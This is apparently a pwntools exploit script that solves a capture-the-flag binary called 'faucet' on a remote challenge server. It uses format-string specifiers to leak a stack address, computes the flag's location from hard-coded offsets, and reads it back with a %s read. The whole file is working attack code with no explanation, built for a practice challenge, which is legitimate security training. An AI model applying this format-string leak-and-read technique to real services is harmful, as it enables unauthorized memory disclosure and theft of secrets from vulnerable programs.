#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template faucet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('faucet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

HOST, PORT = ('challenge.ctf.games', 31771)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def send_payload(payload):
    io = start()
    io.recvuntil(b"> ")
    io.sendline(b"5")
    io.recvuntil(b"?: ")
    io.sendline(payload)
    io.recvuntil(b"a ")
    res = io.recvline()
    if b"END" not in res and b"EN" in res:
        res = res.replace(b"EN", b"END")
    io.close()
    return res

# fmtstr = FmtStr(execute_fmt=send_payload)

io = start()

io.recvuntil(b"> ")
io.sendline(b"5")
io.recvuntil(b"?: ")
payload = b"%8$p" if args.REMOTE else b"%4$p"
io.sendline(payload)
io.recvuntil(b"a ")
leak = int(io.recvline().strip(), 0)
log.info("Got leak! {}".format(hex(leak)))

flag = leak + 0x1e20 + (0xb00 if args.REMOTE else 0)
log.info("flag is at: {}".format(hex(flag)))

io.recvuntil(b"> ")
io.sendline(b"5")
io.recvuntil(b"?: ")
payload = b"a"*(8) + p64(flag)
io.sendline(payload)

io.recvuntil(b"> ")
io.sendline(b"5")
io.recvuntil(b"?: ")
payload = b"%7$s"
io.sendline(payload)

io.interactive()

